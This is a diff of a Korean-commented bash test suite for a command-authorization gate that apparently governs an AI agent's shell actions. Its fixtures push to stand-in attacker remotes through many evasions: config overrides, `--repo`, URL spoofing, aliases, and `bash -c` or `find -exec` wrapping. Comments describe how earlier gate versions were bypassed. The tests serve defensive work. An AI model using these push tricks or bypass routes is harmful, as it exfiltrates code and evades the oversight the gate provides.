+check "63: --git-dir 과 --work-tree 뒤에서도 부명령을 읽는다" \
+  "$(s63 'G git --git-dir=/m/.git --work-tree=/w push origin HEAD')" "외부상태변경"
+check "63: git pull 은 외부 상태 변경이고 fetch 는 읽기다" \
+  "$(s63 'G git pull --ff-only origin master; G git fetch origin master')" "외부상태변경
+읽기"
+# `-c` 로 원격 URL 을 갈아끼우면 push 는 대상 저장소의 이름을 그대로 달고
+# 전혀 다른 곳으로 나간다 — 등급도 결속도 그 argv 를 보고는 알 수 없으므로,
+# 문법을 넓히면서 이 두 키만은 인가 전에 거절한다.
+check "63: remote 재지정 -c 는 형태 미상이다" \
+  "$(s63 'G git -c remote.origin.pushurl=git@evil:x push origin HEAD
+          G git -c remote.origin.url=git@evil:x push origin HEAD')" "형태 미상
+형태 미상"
+check "63: 무해한 -c 는 부명령을 그대로 읽는다" \
+  "$(s63 'G git -c color.ui=false status')" "읽기"
+# `rebase -x <cmd>` 는 고르는 커밋마다 `<cmd>` 를 셸로 돌린다. 쓰기 목록에 있던
+# 동안 그 명령은 워크트리 쓰기 신고 하나로 등급 밖에서 수행됐다. 짧은 옵션은
+# 묶여 적힐 수 있고 긴 옵션은 줄여 적힐 수 있으므로 둘 다 본다.
+check "63: 명령을 싣는 rebase 는 형태 미상이다" \
+  "$(s63 'G git rebase -x make HEAD~1
+          G git rebase --exec=make HEAD~1
+          G git rebase --ex make HEAD~1
+          G git rebase -ix make HEAD~1
+          G git rebase origin/master
+          G git rebase -- -x')" \
+  "형태 미상
+형태 미상
+형태 미상
+형태 미상
+워크트리쓰기
+워크트리쓰기"
+# 실물 git 은 붙임 꼴을 rc 129 로 거절한다. 게이트가 그것을 읽어 주면 실물이
+# 돌지 않을 철자에 등급이 서고, 그 등급이 선언 대조의 근거가 된다.
+check "63: 붙임 꼴 전역 옵션은 형태 미상이다" \
+  "$(s63 'G git -C/tmp status; G git -cfoo=bar status')" "형태 미상
+형태 미상"
+graded_as 외부상태변경 '63: grade 동사도 -C 뒤의 부명령을 읽는다' \
+  -- git -C /w push -u origin b:b
+
+# (2) 협업 팔. `git pull` 은 선언할 수 있는 어느 도달로도 통과하지 못했다 —
+# 등급을 로컬 쓰기로 다시 적는 대신 팔이 그 단어를 인정한다.
+check "63: 협업 팔이 push·pull·fetch 를 인정한다" \
+  "$(s63 'B git push origin HEAD; B git pull --ff-only origin master; B git fetch origin master')" \
+  "1
+1
+1"
+check "63: 전역 옵션이 앞서도 협업 팔이 부명령을 찾는다" \
+  "$(s63 'B git -C /w push -u origin b:b')" "1"
+check "63: git status 는 협업 팔이 아니다" "$(s63 'B git status')" "0"
+
+# (3) 사전 인가 형태. 인가 목록은 `git push` 라고 적히고 스테이지는 워크트리를
+# 가리키며 부른다 — 정규화가 전역 옵션을 남기면 그 둘은 영원히 다른 형태다.
+check "63: 전역 옵션은 사전 인가 형태에서 빠진다" \
+  "$(s63 'C git -C /w push -u origin b:b
+          C git --git-dir=/m/.git push origin HEAD
+          C git push origin HEAD')" \
+  "git push -u origin b:b
+git push origin HEAD
+git push origin HEAD"
+
+# (4) push 원격. 실제 저장소 둘 — 대상 슬러그의 `origin` 을 가진 것과 원격이
+# 없는 것 — 을 두고, 어느 디렉터리에서 해소되는지 본다.
+G63=$(mktemp -d "$WORK/g63.XXXXXX")
+git init -q "$G63/good" && ( cd "$G63/good" && git remote add origin git@github.com:o/r.git )
+git init -q "$G63/lone"
+check "63: 원격은 -C 디렉터리에서 해소된다" \
+  "$(s63 "P $G63/lone git -C $G63/good push origin HEAD")" "1"
+# 빈 URL 은 「대상의 원격이다」가 아니라 「모른다」이다. 통과로 읽던 자리가
+# 이름만 같고 실체가 다른 `origin` 을 대상 행의 슬러그로 대답하게 했다.
+check "63: 빈 URL 은 통과가 아니라 불일치다" \
+  "$(s63 "P $G63/good git -C $G63/lone push origin HEAD; P $G63/lone git push origin HEAD")" \
+  "0
+0"
+check "63: 원격이 있는 디렉터리의 맨 push 는 통과한다" \
+  "$(s63 "P $G63/good git push origin HEAD")" "1"
+check "63: --git-dir 도 실효 디렉터리를 정한다" \
+  "$(s63 "P $G63/lone git --git-dir=$G63/good/.git push origin HEAD")" "1"
+# 몸통에서 옮긴 행위는 어디서 해소해야 하는지 이 자리에서 알 수 없다.
+check "63: 몸통에서 옮긴 행위는 원격을 해소할 수 없다" \
+  "$(s63 "P $G63/good env --chdir=/x git push origin HEAD")" "0"
+check "63: 직접 적은 URL 은 슬러그로 대조한다" \
+  "$(s63 "P $G63/lone git push git@github.com:o/r.git HEAD
+          P $G63/lone git push git@github.com:other/x.git HEAD")" \
+  "1
+0"
+# 원격을 적지 않은 push 는 git 이 고르는 원격으로 나간다 — `branch.<b>.pushRemote`,
+# `remote.pushDefault`, `branch.<b>.remote`, 그리고 없으면 `origin`. 이 자리가
+# 무조건 통과하던 동안 앞선 `git config` 한 번이 push 를 남의 원격으로 돌렸다.
+git init -q "$G63/pdef" && ( cd "$G63/pdef" && git remote add origin git@github.com:o/r.git \
+  && git remote add zz https://attacker.example/x.git && git config remote.pushDefault zz )
+git init -q "$G63/bpr" && ( cd "$G63/bpr" && git remote add origin git@github.com:o/r.git \
+  && git remote add zz https://attacker.example/x.git \
+  && git config "branch.$(git symbolic-ref --short HEAD).pushRemote" zz )
+check "63: 원격을 적지 않은 push 는 git 이 고르는 원격으로 대조한다" \
+  "$(s63 "P $G63/good git push
+          P $G63/lone git push
+          P $G63/pdef git push
+          P $G63/bpr git push
+          P $G63/pdef git push origin HEAD")" \
+  "1
+0
+0
+0
+1"
+check "63: push 원격을 고르는 설정 키는 형태 미상이다" \
+  "$(s63 "G git -c remote.pushDefault=zz push
+          G git config remote.pushDefault zz
+          G git config branch.master.pushRemote zz
+          G git config remote.origin.push refs/heads/x:refs/heads/master
+          G git config push.default matching")" \
+  "형태 미상
+형태 미상
+형태 미상
+형태 미상
+형태 미상"
+check "63: 설정으로 고른 남의 원격 push 도 도달 판정에서 멈춘다" \
+  "$(s63 "Q $G63/pdef git push")" "push원격불일치"
+check "63: 읽을 수 없는 전역 문법은 push 결속도 통과하지 못한다" \
+  "$(s63 "P $G63/good git -cfoo=bar push origin HEAD")" "0"
+# `--repo` 는 push 가 원격을 적는 또 하나의 철자다. 위치 인자만 읽던 자리는 이
+# 철자를 「원격을 적지 않았다」로 읽어, 남의 URL 로 나가는 push 를 그대로
+# 통과시켰다 — 결속이 없는 것이 아니라 있는 결속을 보지 못한 것이다.
+check "63: --repo 로 적은 원격도 슬러그로 대조한다" \
+  "$(s63 "P $G63/lone git push --repo=git@github.com:o/r.git
+          P $G63/lone git push --repo git@github.com:o/r.git
+          P $G63/lone git push --repo=https://attacker.example/x.git
+          P $G63/lone git push --repo https://attacker.example/x.git")" \
+  "1
+1
+0
+0"
+# 실물 git 은 위치 인자가 있으면 그것을 쓰고 `--repo` 를 버린다. 게이트가 반대로
+# 읽으면 「--repo 에 남의 URL, 위치 인자에 대상 원격」이 불일치로 뒤집힌다.
+check "63: 위치 인자가 있으면 --repo 보다 그것이 앞선다" \
+  "$(s63 "P $G63/good git push --repo=https://attacker.example/x.git origin HEAD")" "1"
+check "63: --repo 의 남의 URL 도 도달 판정에서 멈춘다" \
+  "$(s63 "Q $G63/good git push --repo=https://attacker.example/x.git")" "push원격불일치"
+# 호스트는 슬러그의 일부다. 슬러그만 보면 남의 호스트에 같은 이름으로 올린
+# 저장소가 대상 저장소로 통과한다.
+check "63: 외래 호스트의 대상 슬러그는 불일치다" \
+  "$(s63 "P $G63/lone git push https://ghe.attacker.example/o/r.git HEAD
+          P $G63/lone git push git@ghe.attacker.example:o/r.git HEAD
+          P $G63/lone git push https://github.com/o/r.git HEAD")" \
+  "0
+0
+1"
+# 권한부는 첫 `/`·`?`·`#` 에서 끝나고 사용자 정보는 마지막 `@` 까지다. 첫
+# `@` 까지 지우고 `/` 에서만 자르던 축소기는 `?@` 철자를 기본 호스트의 대상
+# 슬러그로 읽었고, 스킴 없는 빈 호스트도 기본 호스트로 인정됐다.
+check "63: ?@·#@ 철자와 file 스킴은 대상이 아니다" \
+  "$(s63 "P $G63/lone git push 'https://evil.example?@github.com/o/r' HEAD
+          P $G63/lone git push 'https://evil.example#@github.com/o/r' HEAD
+          P $G63/lone git push file:///o/r HEAD
+          P $G63/lone git push https://u@x@github.com/o/r.git HEAD")" \
+  "0
+0
+0
+1"
+# URL 경로는 정확히 `<owner>/<repo>` 다. 앞의 두 마디만 잘라 읽던 축소기는
+# `…/o/r/../../x/y` 를 대상 슬러그로 읽었고, 서버는 `..` 를 접어 `x/y` 로 받는다.
+# 셋째 마디, `.`·`..` 마디, 그리고 그 둘을 적을 수 있는 퍼센트 이스케이프는
+# 읽지 않는다.
+check "63: 경로에 더 붙은 마디와 점 마디는 대상이 아니다" \
+  "$(s63 "P $G63/lone git push https://github.com/o/r/../../x/y HEAD
+          P $G63/lone git push git@github.com:o/r.git/../../x/y.git HEAD
+          P $G63/lone git push https://github.com/o/.. HEAD
+          P $G63/lone git push https://github.com/o/r/x HEAD
+          P $G63/lone git push https://github.com/o/r%2F..%2F..%2Fx%2Fy HEAD
+          P $G63/lone git push https://github.com/o/r.git/ HEAD")" \
+  "0
+0
+0
+0
+0
+1"
+# 값을 받는 push 옵션의 값은 원격이 아니다. 모든 `-*` 를 건너뛰던 동안 `-o` 의
+# 값 `origin` 이 원격으로 읽혀 대상과 맞았고, git 은 그 뒤의 URL 로 나갔다.
+# 목록에 없는 옵션은 다음 낱말을 받는지 모르므로 불일치로 닫는다.
+check "63: 값 받는 push 옵션의 값은 원격으로 읽히지 않는다" \
+  "$(s63 "P $G63/good git push -o origin https://attacker.example/x.git HEAD:feature
+          P $G63/good git push --receive-pack origin https://attacker.example/x.git HEAD
+          P $G63/good git push --push-option=x origin HEAD
+          P $G63/good git push -u --force-with-lease origin HEAD
+          P $G63/good git push --frobnicate origin HEAD")" \
+  "0
+0
+1
+1
+0"
+check "63: 옵션 값에 가린 남의 URL push 도 도달 판정에서 멈춘다" \
+  "$(s63 "Q $G63/lone git -C $G63/good push -o origin https://attacker.example/x.git HEAD:feature")" "push원격불일치"
+# `-C` 는 상대 경로를 받고, 여러 번이면 앞의 결과에 이어 접힌다. 절대 경로만
+# 넘기던 위의 줄들은 그 접기를 재지 못했고, 접기가 틀리면 원격이 엉뚱한
+# 디렉터리에서 해소된다.
+check "63: 상대 -C 는 행위 디렉터리에서 접히고 두 번이면 누적된다" \
+  "$(s63 "P $G63 git -C good push origin HEAD
+          P $G63 git -C lone -C ../good push origin HEAD")" \
+  "1
+1"
+check "63: 상대 -C 뒤의 남의 URL push 도 도달 판정에서 멈춘다" \
+  "$(s63 "Q $G63 git -C good push https://attacker.example/x.git HEAD")" "push원격불일치"
+
+# (5) 도달 판정 전체. 원격 대조와 사다리가 옳아도 판정이 `git:-C` 같은 날
+# argv 로 갈라 그 둘에 닿지 않으면, 협업 칸이 push 를 찾아 그대로 승인한다 —
+# 연결된 워크트리의 스테이지가 평소에 쓰는 바로 그 철자다.
+check "63: -C 뒤의 남의 URL push 는 도달 판정에서 멈춘다" \
+  "$(s63 "Q $G63/lone git -C $G63/good push https://attacker.example/x.git HEAD:master
+          Q $G63/good git -C . push https://attacker.example/x.git HEAD
+          Q $G63/good env FOO=1 git push https://attacker.example/x.git HEAD")" \
+  "push원격불일치
+push원격불일치
+push원격불일치"
+check "63: 읽을 수 없는 전역 뒤의 push 도 도달 판정에서 멈춘다" \
+  "$(s63 "Q $G63/good git -cfoo=bar push origin HEAD")" "push원격불일치"
+# `find` 의 둘째 `-exec` 로 넘긴 push. 파서가 첫 `-exec` 만 벗기던 동안 이 argv 는
+# `true` 로 읽혀 읽기 칸에서 먼저 통과했다. 그 뒤로도 원격 대조는 맨 위의
+# `git` 만 보았으므로, `-exec` 안의 push 는 어느 도달로 신고하든 대조를 지나지
+# 않았다. 이제 안쪽 push 도 맨 push 처럼 원격을 대조한다.
+check "63: find 의 둘째 -exec 로 넘긴 push 는 원격 대조에서 멈춘다" \
+  "$(s63 "Q $G63/good find . -maxdepth 0 -exec true ';' -exec git push https://attacker.example/x.git HEAD ';'
+          QR=dev; Q $G63/good find . -maxdepth 0 -exec git push https://attacker.example/x.git HEAD:master ';'")" \
+  "push원격불일치
+push원격불일치"
+
+# (5b) 몸통 안의 push. 원격 대조와 사다리가 맨 위 argv0 이 `git` 일 때만 돌던
+# 동안, `bash -c 'git push <남의 URL> HEAD:master'` 는 `git push` 사전 인가 행에
+# 조각별로 맞아 불투명 상한이 풀리고 원격도 머지 칸도 보지 않은 채 dev·prod·배포
+# 트리거로 나갔다. 같은 push 를 맨몸으로 적으면 거절되던 것이다. 조각마다
+# `ok`/`bad` 와 사다리 칸을, push 가 아닌 조각은 제 등급이 형태 미상일 때만
+# `form` 을 한 줄씩 낸다.
+check "63: 몸통 안의 push 조각도 원격과 사다리를 받는다" \
+  "$(s63 "D $G63/good bash -c 'git push https://attacker.example/x.git HEAD:master'
+          D $G63/good bash -c 'git push origin HEAD:topic'
+          D $G63/good bash -c 'git status; git push origin HEAD:master'
+          D $G63/good bash -c 'git -c remote.origin.pushurl=https://attacker.example/x.git push origin HEAD:topic'
+          D $G63/good bash -c 'cd /tmp && git push origin HEAD:topic'
+          D $G63/good bash -c \"sh -c 'git push https://attacker.example/x.git HEAD:topic'\"
+          D $G63/good bash -c 'git config core.sshCommand x; git status'
+          D $G63/good bash -c 'git status; ls'")" \
+  "bad 머지
+ok push
+ok 머지
+bad 머지
+bad 머지
+bad push
+form -"
+check "63: 몸통 안의 남의 URL push 는 도달 판정에서 멈춘다" \
+  "$(s63 "Q $G63/good bash -c 'git push https://attacker.example/x.git HEAD:master'
+          QR=dev; Q $G63/good sh -c 'true; git push https://attacker.example/x.git HEAD:topic'")" \
+  "push원격불일치
+push원격불일치"
+# 불투명 부류로 끝까지. `git push` 사전 인가 행은 몸통의 push 조각에 맞아 상한을
+# 푼다 — 대조군이 그것을 보인다. 풀린 뒤에도 남의 URL 은 원격 대조에서 멈추고,
+# 제 등급이 형태 미상인 push 조각도 맨 push 와 같이 원격 불일치로 멈춘다. 인가
+# 행이 없는 몸통은 풀리지 않는다.
+pre_parse
+sp_man "$G63/push.md" 'git push'
+sp_man "$G63/none.md" 'gh pr'
+check "63: 인가 행으로 풀린 몸통 push 도 원격 대조를 받는다" \
+  "$(s63 "L $G63/good $G63/push.md bash -c 'git push origin HEAD:topic'
+          L $G63/good $G63/push.md bash -c 'git push https://attacker.example/x.git HEAD:master'
+          QR=prod; L $G63/good $G63/push.md sh -c 'git push https://attacker.example/x.git HEAD:topic'
+          QR=dev; L $G63/good $G63/push.md bash -c 'git -c remote.origin.pushurl=https://attacker.example/x.git push origin HEAD:topic'
+          L $G63/good $G63/none.md bash -c 'git push origin HEAD:topic'")" \
+  "통과
+push원격불일치
+push원격불일치
+push원격불일치
+신고등급한도"
+# push 가 아닌 조각의 등급이 형태 미상이면 몸통 전체가 풀리지 않는다. 정규형은
+# git 의 전역과 `-*=*` 낱말을 버리므로, 그런 조각도 `git push` 행 옆에서 조각별
+# 대조를 지났다.
+sp_man "$G63/push-cfg.md" 'git push' 'git config'
+check "63: 형태 미상 조각을 품은 몸통은 상한이 풀리지 않는다" \
+  "$(s63 "L $G63/good $G63/push-cfg.md bash -c 'git config core.sshCommand x; git push origin HEAD:topic'
+          L $G63/good $G63/push-cfg.md bash -c 'git config user.name x; git push origin HEAD:topic'")" \
+  "신고등급한도
+통과"
+check "63: 대상 원격으로의 -C push 는 원격 대조를 지난다" \
+  "$(s63 "Q $G63/lone git -C $G63/good push origin HEAD")" "통과"
+check "63: -C 뒤의 베이스 브랜치 push 는 머지 칸이다" \
+  "$(s63 "K $G63/lone git -C $G63/good push origin HEAD:master
+          K $G63/lone git -C $G63/good push origin HEAD:topic
+          K $G63/lone git -cfoo=bar push origin HEAD:topic")" \
+  "머지
+push
+머지"
+# 사다리는 마지막 refspec 하나만 읽으면 앞의 기준 브랜치 목적지를 보지 못하고,
+# 모든 `-*` 를 건너뛰면 값 받는 옵션 뒤의 낱말이 refspec 으로 읽힌다. 목적지가
+# 비었거나 패턴이면 어느 브랜치에 닿는지 argv 로 정할 수 없으므로 머지 칸이다.
+check "63: 기준 브랜치가 어느 refspec 에 있든 머지 칸이다" \
+  "$(s63 "K $G63/good git push origin HEAD:master HEAD:tmp
+          K $G63/good git push origin HEAD:master -o x
+          K $G63/good git push origin :master
+          K $G63/good git push origin 'refs/heads/*:refs/heads/*'
+          K $G63/good git push --frobnicate origin HEAD:topic
+          K $G63/good git push origin HEAD:topic HEAD:tmp
+          K $G63/lone git -C $G63/good push -o origin https://attacker.example/x.git HEAD:feature")" \
+  "머지
+머지
+머지
+머지
+머지
+push
+push"
+# 목적지는 문자열이 아니라 git 이 푸는 대로 읽는다. `heads/master` 는 git 이
+# `refs/heads/master` 로 채우고, 목적지 없는 `HEAD` 는 워크트리가 선 브랜치를
+# 민다. refspec 이 아예 없으면 설정이 정한다 — `remote.<r>.mirror`·`push`, 그리고
+# `push.default=matching` 은 argv 의 어느 낱말도 적지 않은 ref 를 민다.
+git init -q -b master "$G63/onm" && ( cd "$G63/onm" && git remote add origin git@github.com:o/r.git )
+git init -q -b topic "$G63/ont" && ( cd "$G63/ont" && git remote add origin git@github.com:o/r.git )
+git init -q -b topic "$G63/mir" && ( cd "$G63/mir" && git remote add origin git@github.com:o/r.git \
+  && git config remote.origin.mirror true )
+git init -q -b topic "$G63/mat" && ( cd "$G63/mat" && git remote add origin git@github.com:o/r.git \
+  && git config push.default matching )
+check "63: 목적지는 git 이 푸는 대로 읽는다" \
+  "$(s63 "K $G63/ont git push origin HEAD:heads/master
+          K $G63/onm git push origin HEAD
+          K $G63/onm git push origin @
+          K $G63/onm git push origin
+          K $G63/ont git push origin HEAD
+          K $G63/ont git push origin
+          K $G63/mir git push origin
+          K $G63/mat git push origin")" \
+  "머지
+머지
+머지
+머지
+push
+push
+머지
+머지"
+# 표에 없는 부명령은 별칭일 수 있고, 별칭은 push 를 품을 수 있다. 별칭은 행위의
+# 디렉터리에서 해소되므로 그 디렉터리의 설정을 묻는다 — 별칭이 없는 저장소의
+# 같은 낱말은 여전히 선언으로 구제되는 `등급 미상` 이다.
+git init -q "$G63/alias" && ( cd "$G63/alias" && git remote add origin git@github.com:o/r.git \
+  && git config alias.zq63 push && git config alias.yq63 '!true' )
+check "63: 별칭 부명령은 형태 미상이고 push 인식도 닫힌다" \
+  "$(s63 "GATE_ACT_CWD=$G63/alias; G git zq63 origin HEAD; G git yq63
+          GATE_ACT_CWD=$G63/lone; G git zq63 origin HEAD
+          G git -C $G63/alias zq63 origin HEAD
+          GATE_ACT_CWD=$G63/alias; gate_argv_is_git_push git zq63 origin HEAD; printf '%s\n' \$?")" \
+  "형태 미상
+형태 미상
+등급 미상
+형태 미상
+2"
+check "63: 별칭으로 부른 push 는 도달 판정에서 멈춘다" \
+  "$(s63 "Q $G63/alias git zq63 https://attacker.example/x.git HEAD")" "push원격불일치"
+# 실행하거나 원격을 갈아끼우는 설정 키를 쓰는 `git config` 는 뒤의 git 이 무엇을
+# 실행하고 어디로 나가는지를 바꾼다. git 은 키의 절과 변수 이름을 대소문자 없이
+# 읽으므로 대조도 그렇게 한다.
+check "63: 실행·재지정 키를 쓰는 git config 는 형태 미상이다" \
+  "$(s63 "G git config alias.zz push
+          G git config core.sshCommand 'sh -c x'
+          G git config Core.SshCommand 'sh -c x'
+          G git config core.pager 'sh -c x'
+          G git config remote.origin.pushurl https://attacker.example/x.git
+          G git config --add url.https://attacker.example/.insteadOf https://github.com/
+          G git config --global alias.zz push
+          G git -c Core.SshCommand=x fetch origin
+          G git config user.name x
+          G git config --get alias.zz")" \
+  "형태 미상
+형태 미상
+형태 미상
+형태 미상
+형태 미상
+형태 미상
+형태 미상
+형태 미상
+워크트리쓰기
+읽기"
+
+# (6) 종단 간. 위의 줄들은 `GATE_ACT_CWD` 를 손으로 놓고 판정 함수만 부르므로,
+# 동사 진입점이 그 값을 **언제** 놓는지는 재지 못한다. 한동안 그 대입은 push
+# 사다리를 다시 유도하는 블록 **뒤에** 있었고, 그동안 사다리는 세그먼트의
+# 워크트리가 아니라 게이트가 서 있는 디렉터리의 브랜치를 읽었다 — 이 스위트의
+# `gate` 는 `$WT` 에서 돌고 `$WT` 는 베이스 브랜치 위라, 그 순서에서는 refspec
+# 없는 어떤 push 든 머지로 유도된다. `plan` 으로 잰다: 아무것도 쓰지 않고
+# 유도값을 예고 줄에 축자로 싣는다.
+check "63G: 이 프로세스에 GATE_ACT_CWD 가 없다" "${GATE_ACT_CWD+set}" ""
+L63="$WORK/l63-wt"
+( cd "$WT" && git worktree add -q -b l63br "$L63" ) >/dev/null 2>&1
+gate act --manifest "$FX_MANIFEST" --kind segment --target infra --segment S63L \
+  --cutpoint 커밋 --surface 읽기 --snapshot-digest "$(HH)" \
+  --rationale "픽스처 — 연결 워크트리를 가리키는 세그먼트" \
+  -- 상태=실행중 워크트리="$L63" 선행=없음
+check "63: 연결 워크트리를 가리키는 세그먼트 행이 선다" "$rc" "0"
+gate plan --manifest "$FX_MANIFEST" --kind x --target infra --segment S63L \
+  --cutpoint 커밋 --rationale x -- git push origin
+check "63: refspec 없는 push 가 커밋 신고를 저선언으로 만든다" "$rc" "8"
+case "$msg" in
+  *"'push' cell"*) ok "63: 그 유도가 세그먼트 워크트리의 브랜치에서 나온다" ;;
+  *) bad "63: 그 유도가 세그먼트 워크트리의 브랜치에서 나온다" "$msg" ;;
+esac
+gate plan --manifest "$FX_MANIFEST" --kind x --target infra --segment S63L \
+  --cutpoint push --rationale x -- git push origin
+check "63: push 로 올려 신고하면 그대로 통과한다" "$rc" "0"
+# 대조군. 같은 argv 가 베이스 브랜치 위의 워크트리를 가리키는 세그먼트에서는
+# 머지로 유도된다 — 목적지가 베이스라 리뷰 요구가 서야 하는 칸이다. 이 줄이
+# 없으면 위의 두 줄은 「이 철자는 언제나 push 칸이다」와 구별되지 않고, 대입이
+# 다시 사다리 아래로 내려가도 초록으로 남는다.
+gate act --manifest "$FX_MANIFEST" --kind segment --target infra --segment S63M \
+  --cutpoint 커밋 --surface 읽기 --snapshot-digest "$(HH)" \
+  --rationale "픽스처 — 베이스 브랜치 위의 워크트리를 가리키는 세그먼트" \
+  -- 상태=실행중 워크트리="$WT" 선행=없음
+gate plan --manifest "$FX_MANIFEST" --kind x --target infra --segment S63M \
+  --cutpoint push --rationale x -- git push origin
+check "63: 베이스 브랜치 위의 세그먼트에서는 같은 argv 가 머지로 유도된다" "$rc" "8"
+case "$msg" in
+  *"'머지' cell"*) ok "63: 그 대조군의 유도가 머지다" ;;
+  *) bad "63: 그 대조군의 유도가 머지다" "$msg" ;;
+esac
+# 몸통 안의 push 도 같은 사다리에 선다. 사다리가 맨 위 argv0 이 `git` 일 때만
+# 유도되던 동안, 베이스 브랜치로 가는 push 를 셸 본문에 넣으면 머지보다 낮은
+# 신고로 리뷰 요구 없이 지났다.
+gate plan --manifest "$FX_MANIFEST" --kind x --target infra --segment S63M \
+  --cutpoint push --rationale x -- bash -c 'git status; git push origin HEAD'
+check "63: 몸통 안의 베이스 브랜치 push 도 push 신고를 저선언으로 만든다" "$rc" "8"
+case "$msg" in
+  *"'머지' cell"*) ok "63: 몸통 push 의 유도가 머지다" ;;
+  *) bad "63: 몸통 push 의 유도가 머지다" "$msg" ;;
+esac
 
 # ---------------------------------------------------------------------------
 # 40. `wait` 의 종료 코드와 무행·무경계 성질
@@ -21159,6 +21910,592 @@ check "58: gate_main 다음 줄이 exit 다" \
   "$(awk '/^[[:space:]]*$/ || /^[[:space:]]*#/ { next } { a = b; b = c; c = $0 } END { print a "|" b "|" c }' "$GATE")" 'fi|gate_main "$@"|exit'
 check "58: 소스 전용 가드는 gate_main 앞에 있다" \
   "$(awk '/CC_GATE_SOURCE_ONLY:-0/ { g = NR } /^gate_main "\$@"$/ { m = NR } END { print (g > 0 && g < m) ? "앞" : "아님" }' "$GATE")" "앞"
+
+# ---------------------------------------------------------------------------
+# 64. The parsed argv reaches the two rules that read argv
+# --- section: 64 | group: parse | covers: act, plan | anchors: 64: 두 줄 본문이 정규 전송에서 형태에 맞는다, 64: RT-B-preauth3 — 상대 경로 스크립트는 목록 밖이다, 64: --admin 은 정규 전송에서도 거부된다, 64: 게이트는 등급된 argv 에만 전송을 싣는다, 64: 두 줄 본문 행위가 게이트를 통과한다 ---
+#
+# 이 절이 재는 것은 룰 두 개의 **판정**이지 게이트의 등급이 아니다. 그래서
+# 대부분의 단언은 룰을 직접 돌린다 — 게이트를 소싱해 `gp_canon` 으로 전송값을
+# 만들고, 그 값을 실은 채·안 실은 채·빈 값으로 실은 채 세 번 돌린다. 세 번인
+# 이유는 폴백이 두 갈래가 아니라 세 갈래이기 때문이다: 부재는 옛 경로, 빈 값은
+# 게이트의 버그이고, 둘을 같게 다루면 버그가 모든 행위를 통과시킨다.
+#
+# 절 58 과 같은 이유로 소싱은 /bin/bash 로 하고 본문은 `set -u` 아래에서 돈다.
+# ---------------------------------------------------------------------------
+S64_DIR="$WORK/s64"
+mkdir -p "$S64_DIR"
+
+# 매니페스트 헬퍼는 절 60 도 부르므로 머리의 `pre_parse` 에 있다.
+pre_parse
+
+s64() {
+  # s64 <모드> <룰> <매니페스트> <argv...> — 모드는 canon·off·empty,
+  # 룰은 preauth·selfext. preauth 는 탐침 한 줄을, selfext 는 `rc=<n>` 을 찍는다.
+  local mode="$1" rule="$2" man="$3"
+  shift 3
+  ( cd "$repo_root" && CC_GATE_SOURCE_ONLY=1 \
+      S64_GATE="$GATE" S64_MODE="$mode" S64_RULE="$rule" S64_MAN="$man" \
+      S64_GRANT="${S64_GRANT:-}" S64_SURFACE="${S64_SURFACE:-트리밖쓰기}" \
+      /bin/bash -c '
+        . "$S64_GATE" </dev/null
+        unset CC_GATE_SOURCE_ONLY
+        trap - EXIT ERR INT TERM
+        set +e
+        set -u
+        case "$S64_MODE" in
+          canon)
+            gp_parse "$@"
+            case "$GP_STATUS" in
+              ok|tool)
+                if _c=$(gp_canon); then GATE_ARGV_CANON="$_c"; export GATE_ARGV_CANON; fi ;;
+            esac ;;
+          empty) GATE_ARGV_CANON=""; export GATE_ARGV_CANON ;;
+        esac
+        GATE_ARGV="$*"; export GATE_ARGV
+        GATE_MANIFEST="$S64_MAN"; export GATE_MANIFEST
+        GATE_SURFACE="$S64_SURFACE"; export GATE_SURFACE
+        GATE_MARK=일반; export GATE_MARK
+        GATE_MARK_TRIGGER=""; export GATE_MARK_TRIGGER
+        GATE_GRANT="$S64_GRANT"; export GATE_GRANT
+        if [ "$S64_RULE" = preauth ]; then
+          GATE_PREAUTH_PROBE=1 /bin/sh "$(gate_rules_dir)/사전-인가-대조.sh" 2>/dev/null
+        else
+          /bin/sh "$(gate_rules_dir)/인가-자기확장-금지.sh" >/dev/null 2>&1
+          printf "rc=%s\n" "$?"
+        fi' _ "$@" )
+}
+
+# (1) R1 — `claude -p` 형태 셋에서 전송 있음과 없음이 바이트 동일하고, 빈 값은
+# 어느 형태에서도 목록 밖이다. 셋은 옛 awk 의 세 갈래를 하나씩 지난다: 맨 형태,
+# `-*=*` 단어 버리기, 그리고 공백을 품은 operand — 마지막 것은 두 경로가 서로
+# 다른 단어열을 보면서도 같은 답에 닿아야 하는 자리다.
+S64_MAN_CLAUDE="$S64_DIR/claude.md"
+sp_man "$S64_MAN_CLAUDE" 'claude -p'
+s64_i=0
+for s64_argv in \
+  'claude -p /cc-cmds:autopilot-router-shift RA1' \
+  'claude -p --permission-mode=bypassPermissions /cc-cmds:x' \
+  'claude -p /cc-cmds:x␣--flag'
+do
+  s64_i=$((s64_i + 1))
+  # `␣` 는 공백 한 칸의 자리표시자다 — 이 루프는 argv 를 공백으로 쪼개 넘기므로
+  # 공백을 품은 한 단어를 리터럴로는 적을 수 없다.
+  # shellcheck disable=SC2086
+  set -- $s64_argv
+  s64_words=()
+  for s64_w in "$@"; do s64_words+=("${s64_w//␣/ }"); done
+  check "64: claude 형태 $s64_i — 전송 있음과 없음의 판정이 같다" \
+    "$(s64 canon preauth "$S64_MAN_CLAUDE" "${s64_words[@]}")" \
+    "$(s64 off preauth "$S64_MAN_CLAUDE" "${s64_words[@]}")"
+  check "64: claude 형태 $s64_i — 전송 있음은 목록 안이다" \
+    "$(s64 canon preauth "$S64_MAN_CLAUDE" "${s64_words[@]}")" "P=1 형태=완전 Pd=0"
+  check "64: claude 형태 $s64_i — 빈 값은 어느 형태에서도 P=0 이다" \
+    "$(s64 empty preauth "$S64_MAN_CLAUDE" "${s64_words[@]}")" "P=0 형태=없음 Pd=0"
+  # 같은 세 실행을 자기확장 금지 룰에도 돌린다. 이 argv 에는 관리자 플래그도
+  # 인가 기록 경로도 없으므로 통과가 옳고, 빈 값만 거부다.
+  check "64: claude 형태 $s64_i — 자기확장 금지도 전송 있음과 없음이 같다" \
+    "$(s64 canon selfext "$S64_MAN_CLAUDE" "${s64_words[@]}")" \
+    "$(s64 off selfext "$S64_MAN_CLAUDE" "${s64_words[@]}")"
+  check "64: claude 형태 $s64_i — 자기확장 금지는 빈 값을 거부한다" \
+    "$(s64 empty selfext "$S64_MAN_CLAUDE" "${s64_words[@]}")" "rc=1"
+done
+
+# (2) #812 재현 2 — 두 줄 본문. 옛 경로는 둘째 줄을 둘째 명령으로 읽어 자기
+# 매니페스트의 `gh pr` 행을 놓쳤다. 이 한 줄이 그 이슈의 닫힘이다.
+S64_MAN_GH="$S64_DIR/gh.md"
+sp_man "$S64_MAN_GH" 'gh pr'
+s64_body='첫 줄
+둘째 줄'
+check "64: 두 줄 본문이 정규 전송에서 형태에 맞는다" \
